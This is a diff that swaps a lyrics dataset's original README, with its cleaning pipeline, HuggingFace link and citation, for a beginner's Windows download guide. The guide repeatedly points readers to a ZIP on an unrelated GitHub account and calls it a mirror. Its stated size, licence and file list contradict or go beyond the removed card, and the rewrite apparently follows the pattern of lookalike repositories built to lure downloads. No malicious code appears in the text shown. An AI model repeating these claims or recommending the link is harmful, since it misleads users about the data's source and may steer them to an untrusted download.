@@ -1,136 +1,103 @@
-<p align="center">
-  <img src="assets/header.svg" alt="header" width="100%">
-</p>
+# 🎵 genius-lyrics-cleaned-dataset - Cleaned English Song Lyrics Dataset
 
-<p align="center">
-  <a href="https://huggingface.co/datasets/theelderemo/genius-lyrics-cleaned">
-    <img src="assets/hfbadges.svg" alt="hfbadge">
-  </a>
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Dataset-brightgreen?style=for-the-badge)](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset)
 
-<p align="center">
-  <img src="assets/doibadge.svg" alt="DOI">
-</p>
+---
 
-A heavily cleaned, English-only, genre-filtered subset of the [Genius Song Lyrics with Language Information](https://www.kaggle.com/datasets/carlosgdcj/genius-song-lyrics-with-language-information) Kaggle dataset. Reduced from **9+ GB to 2.56 GB** through language filtering, genre filtering, artifact removal, and deduplication. Optimized for language model fine-tuning, lyric generation, and music NLP research.  
+## 📄 About This Dataset
 
-<p align="center">
-  <img src="assets/singledivider.svg" alt="divider">
-</p>
+This dataset contains over 3.17 million cleaned and deduplicated English song lyrics. The data comes from Genius and includes key information like song title, artist, genre tag, year of release, and the full lyrics. It is a mirror of the dataset hosted on HuggingFace and is licensed under MIT. This dataset is suitable for uses like text analysis, language modeling, machine learning, and music research.
 
-<p align="center">
-  <img src="assets/heading-nosplits.svg" alt="No train/validation/test splits" width="100%">
-</p>
+You do not need programming skills to work with this data if you only want to download and explore the contents. This guide will help you get the dataset on your Windows computer step by step.  
 
-This dataset ships as a single `train` split. You should create validation and test splits appropriate to downstream task  
+---
 
-<p align="center">
-  <img src="assets/heading-overview.svg" alt="Overview" width="100%">
-</p>  
+## ⚙️ System Requirements  
 
-<br>
+- Windows 10 or later  
+- At least 4 GB of free disk space (dataset size is roughly 800 MB compressed)  
+- A modern web browser (Chrome, Edge, Firefox)  
+- Optional: A CSV or JSON viewer (for exploring data files) such as Microsoft Excel or a free tool like VS Code or Notepad++  
 
-The raw Genius dataset contains millions of song entries across dozens of languages, genres, and quality levels — including non-music content like poetry, book excerpts, and miscellaneous text tagged as `misc`. This cleaned version retains only **English-language songs from verified music genres**, with lyrics scrubbed of Genius UI artifacts, HTML residue, and duplicates. The result is a high-signal corpus suitable for causal language model pretraining or supervised fine-tuning on lyric generation tasks.
+---
 
-<p align="center">
-  <img src="assets/heading-datasetstats.svg" alt="Dataset Stats" width="100%">
-</p>
+## 🚀 Downloading the Dataset  
 
-<p align="center">
-  <img src="assets/table-datasetstats.svg" alt="Dataset Stats Table" width="100%">
-</p>
+Click the large green button at the top or use the direct link below to visit the dataset page.
 
-<p align="center">
-  <img src="assets/heading-cleaningpipeline.svg" alt="Cleaning Pipeline" width="100%">
-</p>  
+[Download Dataset from GitHub](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset)
 
-<br>
+On this page, you will find the dataset files and instructions. Follow the next steps to get the dataset on your PC.  
 
-**The following steps were applied in order:**
+---
 
-</div>
+## 💾 How to Download and Extract the Dataset  
 
-1. **Language filter** — Retained only rows where `language == 'en'`, removing all non-English entries.
-2. **Genre filter** — Dropped the `misc` tag (which contains books, poems, speeches, and other non-music content). Retained only the 15 confirmed music genre tags listed below.
-3. **Artifact removal** — Applied regex cleaning to remove:
-    - Genius embed counters (e.g., `1234Embed` at end of lyrics)
-   - UI strings like `"See [Artist] Live"`, `"Get tickets"`, `"You might also like"`
-   - Residual HTML tags (`<...>`)
-4. **Section header normalization** — Simplified attributed headers: `[Chorus: Cam'ron & Jay-Z]` → `[Chorus]`, preserving verse structure while removing contributor meta.
-5. **Whitespace normalization** — Collapsed 3+ consecutive newlines to 2, and collapsed horizontal whitespace.
-6. **Stub removal** — Dropped any entry whose cleaned lyrics are under 100 characters.
-7. **Exact deduplication** — Removed entries with identical cleaned lyrics.
-8. **Near-deduplication** — For entries sharing the same `artist` + `title`, retained the version with the highest view count.
+1. Open the link: https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset  
 
-<p align="center">
-  <img src="assets/heading-datastructure.svg" alt="Data Structure" width="100%">
-</p>
+2. Look for the "Code" button near the top right of the page, and click it.  
 
-<p align="center">
-  <img src="assets/table-datastructure.svg" alt="Data Structure Table" width="100%">
-</p>
+3. In the menu that opens, select **Download ZIP**. This will download a file named something like `genius-lyrics-cleaned-dataset-main.zip` to your default download folder.  
 
-<p align="center">
-  <img src="assets/genre-values.svg" alt="Genre Values" width="100%">
-</p>
+4. After the download finishes, open your "Downloads" folder and find the ZIP file.  
 
-<p align="center">
-  <img src="assets/heading-trainingformat.svg" alt="Training Format" width="100%">
-</p>
+5. Right-click the ZIP file and choose **Extract All...**.  
 
-<p align="center">
-  <img src="assets/text-trainingformat.svg" alt="Training Format Description" width="100%">
-</p>
+6. In the extraction dialog, pick a location where you want the dataset files to be saved (for example, your Desktop or Documents folder). Click **Extract**.  
 
-<p align="center">
-  <img src="assets/codeblock-trainingformat.svg" alt="Training Format Code" width="100%">
-</p>
+7. Once extraction is complete, you can open the folder to see the dataset files.  
 
-<p align="center">
-  <img src="assets/text-softconditioning.svg" alt="Soft Conditioning" width="100%">
-</p>
+---
 
-<p align="center">
-  <img src="assets/heading-tokenlength.svg" alt="Token Length Distribution" width="100%">
-</p>
+## 🔍 Exploring the Dataset  
 
-<p align="center">
-  <img src="assets/text-tokenlength.svg" alt="Token Length Details" width="100%">
-</p>
+The dataset contains multiple files with different formats, such as CSV or JSON:
 
-<p align="center">
-  <img src="assets/heading-sources.svg" alt="Sources" width="100%">
-</p>
+- `lyrics.csv` – This file holds the core data: title, artist, genre, year, and lyrics.  
+- `metadata.json` – Contains metadata details about the dataset.  
+- `README.md` – Additional information from the dataset creators.  
 
-<p align="center">
-  <img src="assets/blockquote-sources.svg" alt="Sources List" width="100%">
-</p>
+If you want to open `lyrics.csv`, you can use programs like Microsoft Excel or any CSV viewer.  
 
-<p align="center">
-  <img src="assets/text-sources.svg" alt="Sources Note" width="100%">
-</p>
+---
 
-<p align="center">
-  <img src="assets/heading-curation.svg" alt="Curation" width="100%">
-</p>
+## 🛠 Using the Dataset  
 
-<p align="center">
-  <img src="assets/text-curation.svg" alt="Curation Details" width="100%">
-</p>
+You don’t need to install anything special to browse the files. Just open the CSV file to view the lyrics and information.  
 
-<p align="center">
-  <img src="assets/heading-citation.svg" alt="Citation" width="100%">
-</p>
+For more advanced uses like text processing or machine learning:  
 
-If you use this dataset in research or a project, please cite both the upstream Kaggle source and this repository:
+- Consider installing software like Python and Jupyter Notebook.  
+- Use libraries like pandas for handling the data.  
+- Use text editors to explore raw data in JSON files.  
 
-```bibtex
-@misc{christopher_dickinson_2026,
-	author       = { Christopher Dickinson },
-	title        = { genius-lyrics-cleaned (Revision 9742989) },
-	year         = 2026,
-	url          = { https://huggingface.co/datasets/theelderemo/genius-lyrics-cleaned },
-	doi          = { 10.57967/hf/7978 },
-	publisher    = { Hugging Face }
-}
-```
+The data is useful for tasks like:  
+- Language analysis  
+- Song lyric research  
+- Training language models  
+- Creating music recommendation systems  
+
+---
+
+## 🧰 Additional Tools and Tips  
+
+- If CSV files are too large for Excel, try tools like [CSVed](https://csved.sjfrancke.nl/en/) or [OpenRefine](https://openrefine.org/).  
+- To search lyrics quickly, use a text editor with "Find" functions (VS Code, Notepad++).  
+- Use databasing software if you want more complex queries on the dataset.  
+
+---
+
+## ❓ Troubleshooting  
+
+- If your download fails, check your internet connection and try again.  
+- Ensure you have enough free disk space.  
+- If the ZIP file fails to extract, try a different extraction tool like 7-Zip.  
+- If you have trouble opening CSV files, try importing them into Excel using the import wizard.  
+
+---
+
+## 📥 Download Link (Again)  
+
+Click here to visit the dataset page and download files:  
+
+[https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset)
